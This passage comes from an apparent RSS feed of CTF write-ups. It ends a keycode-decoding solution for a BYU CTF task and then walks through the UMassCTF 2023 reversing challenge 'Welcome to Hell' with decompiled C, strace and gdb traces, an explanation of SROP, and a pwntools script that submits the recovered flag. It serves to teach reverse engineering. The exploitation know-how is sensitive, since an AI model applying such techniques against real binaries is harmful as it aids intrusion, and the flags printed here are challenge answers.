</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> keycode
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># iterate over keystring and map keycodes to chars</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> stridx, c <span style="color:#f92672">in</span> enumerate(keystr):
</span></span><span style="display:flex;"><span>    datidx <span style="color:#f92672">=</span> stridx <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#75715e"># keycodes are 2 bytes</span>
</span></span><span style="display:flex;"><span>    keycode <span style="color:#f92672">=</span> read_keycode(data, datidx)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># map keycode to key character</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> (keycode <span style="color:#f92672">in</span> keys):
</span></span><span style="display:flex;"><span>        keys[keycode] <span style="color:#f92672">=</span> keystr[stridx]
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># iterate over data and print decoded keys</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> datidx <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(data), <span style="color:#ae81ff">2</span>):
</span></span><span style="display:flex;"><span>    keycode <span style="color:#f92672">=</span> read_keycode(data, datidx)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> keycode <span style="color:#f92672">in</span> keys:
</span></span><span style="display:flex;"><span>        print(keys[keycode], end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(keycode, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>print()
</span></span></code></pre></div><p>Because the encodings for &lsquo;{&rsquo; and &lsquo;}&rsquo; were not given, we have to figure out their mappings. This is simple because they are the only two unmapped chars. The characters &lsquo;b&rsquo; and &lsquo;C&rsquo; also have the same keycode of 0x6500 for some reason but we can manually map these values by uncommenting the following lines.</p>
<pre tabindex="0"><code>#keys[&#39;{  0x65}&#39;] = &#39;C&#39;
#keys[&#39;{2 0x6}&#39;] = &#39;{&#39;
#keys[&#39;{2 0x10}&#39;] = &#39;}&#39;
</code></pre><p>This allows us to determine the flag.
<code>byuctf{1_h0p3_y0u_enj0yed-thi5_very_muCH}</code></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>Welcome to Hell</title>
      <link>https://treseco.github.io/posts/umassctf23/welcome_to_hell/</link>
      <pubDate>Thu, 30 Mar 2023 19:01:07 -0400</pubDate>
      
      <guid>https://treseco.github.io/posts/umassctf23/welcome_to_hell/</guid>
      <description><![CDATA[<h3 id="welcome-to-hell">Welcome To Hell</h3>
<ul>
<li>Author: Battelle</li>
<li>Rev</li>
<li>400 pts</li>
</ul>
<hr>
<h4 id="description">Description</h4>
<blockquote>
<p>Welcome to hell, where all it seems that you can do is try to exit, maybe there is a flag hidden somewhere in this mess</p>
</blockquote>
<hr>
<h4 id="files">Files</h4>
<p><code>welcome_to_hell</code> - ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped</p>
<hr>
<h4 id="reversing">Reversing</h4>
<p>Opening <code>welcome_to_hell</code> in Ghidra shows a few functions. The only one that appears to do anything useful is <code>entry</code>, the first function in the binary. There are many other functions at higher addresses than entry, but they each just call syscall to exit the program. The return value of the <em>n</em>th exit function is <em>n</em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">entry</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> offset;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>bufptr;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf [<span style="color:#ae81ff">8</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">bool</span> neg;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">syscall</span>();       <span style="color:#75715e">//read 3 bytes from stdin to buf
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  neg <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>  bufptr <span style="color:#f92672">=</span> buf <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;-&#39;</span>) {
</span></span><span style="display:flex;"><span>    neg <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>    bufptr <span style="color:#f92672">=</span> buf <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>    buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> buf[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>    offset <span style="color:#f92672">=</span> offset <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">+</span> (<span style="color:#66d9ef">int</span>)(<span style="color:#66d9ef">char</span>)(buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x30</span>);
</span></span><span style="display:flex;"><span>    buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>bufptr;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&lt;</span> <span style="color:#e6db74">&#39;0&#39;</span>) <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    bufptr <span style="color:#f92672">=</span> bufptr <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&lt;</span> <span style="color:#e6db74">&#39;:&#39;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (neg) {
</span></span><span style="display:flex;"><span>    offset <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>offset;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  (<span style="color:#f92672">*</span>(base <span style="color:#f92672">+</span> (<span style="color:#66d9ef">int</span>)((<span style="color:#66d9ef">long</span>)offset <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x11</span>)))(<span style="color:#ae81ff">0</span>,offset,(ulong)((<span style="color:#66d9ef">long</span>)offset <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x11</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x20</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>entry</code> provides some hints at what we should do. First, we see that we can provide some input that will jump to somewhere in the program. The address that we jump to is determined by an offset from <code>base</code>, which is the first exit function that follows <code>entry</code>. We could reverse the address calculations, or just test different offsets and see what exit code is returned.</p>
<pre tabindex="0"><code>$ ./welcome_to_hell
1
$ echo $?
1
$ ./welcome_to_hell
2
$ echo $?
2
$ ./welcome_to_hell
50
$ echo $?
50 
</code></pre><p>Clearly the offset is just the number of exit functions to jump over. However, everything past <code>base</code> exits the program and is not useful. Luckily we can see from <code>entry</code> that we can jump to negative offsets too. But where should we jump to? After looking around we realize that most of the data before <code>base</code> is just ELF headers. The most obvious choice is the suspicious data found in the string table. Decompiling this data does appear to give us intructions but also some invalid instrucitons. There seems to be syscalls in this code, so instead of reversing the invalid instructions let&rsquo;s use <code>strace</code>.</p>
<pre tabindex="0"><code>$ echo &#39;-30&#39; | strace ./welcome_to_hell 
execve(&#34;./welcome_to_hell&#34;, [&#34;./welcome_to_hell&#34;], 0x7ffe934ba3c0 /* 10 vars */) = 0
read(0, &#34;-30&#34;, 3)                       = 3
mmap(0x41414141000, 16384, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, 0, 0) = 0x41414141000
open(&#34;./welcome_to_hell&#34;, O_RDONLY)     = 3
lseek(3, 176, SEEK_SET)                 = 176
read(3, &#34;!\340\214!\350\205ilii\1Ibhh\350]Mhhhh!\321\1\10\5\5\f\7\16\f&#34;..., 12112) = 12112
write(1, &#34;Welcome to the challenge!\n&#34;, 26Welcome to the challenge!
) = 26
write(1, &#34;Enter the flag: &#34;, 16Enter the flag: )        = 16
read(0, &#34;\n&#34;, 48)                       = 1
exit(25)                                = ?
+++ exited with 25 +++
</code></pre><p>The programs first reads in the 3 byte offset, same as before. We pass in &lsquo;-30&rsquo; to jump to the beginning of the string table and run the instuctions there. The program then calls <code>mmap</code>, <code>open</code>, <code>lseek</code>, and <code>read</code> to read in data from the binary and map it into memory. Then we are welcomed to the challenge, and finally get the flag prompt. The program then quits, presumably because we didn&rsquo;t give the flag. Let&rsquo;s look with gdb.</p>
<pre tabindex="0"><code> ► 0x4141414108f     syscall  &lt;SYS_read&gt;
        fd: 0x0 (/dev/pts/0)
        buf: 0x41414142fd0 ◂— xor esi, dword ptr [rbx] /* 0x3333333333333333 */
        nbytes: 0x30
   0x41414141091     mov    rdx, rax
   0x41414141094     mov    rdi, 0x19
   0x4141414109e     je     0x414141410a9                 &lt;0x414141410a9&gt;
   0x414141410a0     mov    rax, 0x3c
   0x414141410a7     syscall 
   0x414141410a9     nop
</code></pre><p>Eventually, reach the <code>read</code> syscall where the flag is read. We can see that if <code>read</code> returns a length other than 0x19 then the program exits. We&rsquo;ll give it a 25 character sting and continue stepping.</p>
<pre tabindex="0"><code>   0x414141410a9    nop    
   0x414141410aa    lea    rsp, [rip + 9]
   0x414141410b1    mov    rax, 0xf
 ► 0x414141410b8    syscall  &lt;SYS_rt_sigreturn&gt;
   0x414141410ba    add    byte ptr [rax], al
   0x414141410bc    add    byte ptr [rax], al
   0x414141410be    add    byte ptr [rax], al
   0x414141410c0    add    byte ptr [rax], al
   0x414141410c2    add    byte ptr [rax], al
</code></pre><p>Ok now that the flag length is correct we are at the instuctions above, which points the stack pointer to the data after the syscall and calls <code>rt_sigreturn</code>. This is a function used to restore the process state after the program returns from handling a signal. Typically the state is stored on the stack before control is transfered to the kernel, and restored by sigreturn when the kernel is done. In this case there is no signal, and the program is using its own fabricated signal frame (the junk instructions after the syscall) to modify the process state. This is a pwn technique know as SROP.</p>
<pre tabindex="0"><code> ► 0x414141411b2    add    r9, rcx
   0x414141411b5    mov    r10, qword ptr [r9 + 1]
   0x414141411b9    xor    rax, r8
   0x414141411bc    add    cl, 0xb
   0x414141411bf    shr    rax, cl
   0x414141411c2    cmp    al, r10b
   0x414141411c5    je     0x414141411c9                 &lt;0x414141411c9&gt;
   
   0x414141411c7    jmp    rdx
   
   0x414141411c9    nop    
   0x414141411ca    lea    rsp, [rip + 9]
   0x414141411d1    mov    rax, 0xf
   0x414141411d8    syscall
</code></pre><p>Each signal frame that is &ldquo;restored&rdquo; has the format above. <code>r10</code> is pointed to the next character in our flag. Some operations are perfomed on <code>rax</code>, but by the compare instruction it will be the correct flag character. At this point we can just contine stepping through, dumping <code>rax</code>, and setting <code>r10</code> to get the full flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./welcome_to_hell&#39;</span>)
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;-30&#39;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;flag: &#39;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;UMASS</span><span style="color:#e6db74">{sr0p_n_r3v_is_h3ll}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvall())
</span></span></code></pre></div><p>Pwntools is usefull to test the flag we found by passing it to to program before it quits and without newlines.</p>
<pre tabindex="0"><code>$ ./heaven.py 
[+] Starting local process &#39;./welcome_to_hell&#39;: pid 1178
[+] Receiving all data: Done (25B)
[*] Stopped process &#39;./welcome_to_hell&#39; (pid 1178)
b&#39;UMASS{sr0p_n_r3v_is_h3ll}&#39;
</code></pre><p>Nice. Overall this was a cool challenge. I certainly learned a lot about the ELF file format and especially UNIX signals. SROP is new to me so this was a neat chance to learn about how it works and how it can be used.</p>
]]></description>
      
    </item>
    
    
  </channel>
</rss>
